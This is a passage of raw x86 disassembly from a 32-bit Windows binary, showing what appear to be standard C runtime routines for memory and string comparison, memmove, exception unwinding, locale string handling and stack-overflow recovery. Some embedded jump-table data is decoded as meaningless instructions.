  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
